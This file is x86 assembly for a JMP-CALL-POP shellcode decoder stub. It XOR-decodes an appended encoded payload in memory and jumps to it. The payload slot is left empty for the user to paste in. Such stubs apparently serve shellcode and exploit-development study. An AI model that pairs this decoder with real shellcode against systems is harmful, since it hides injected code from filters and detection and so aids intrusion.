global _start

section .text

	_start:
		jmp short call_decoder

	decoder:

		pop esi	; shellcode's address
		push esi ; to call the shellcode address

		mov edi,esi
		xor eax,eax
		xor ebx,ebx
		xor ecx,ecx
		xor edx,edx
		
		loop:
			mov al, [esi] ; first byte to xor
			xor al, [esi+1] ; second byte to xor
			mov [edi],al
			
			inc esi 
			inc edi 
			inc ecx
			cmp cl , 0x2 
			jne loop

			inc esi
			xor ecx,ecx	
			add dx, 0x3
			cmp dx, len
			jne loop

		pop eax
		jmp eax

	call_decoder:
		call decoder
                ; paste the encoded shellcode below 
		shellcode: db  
		len: equ $-shellcode


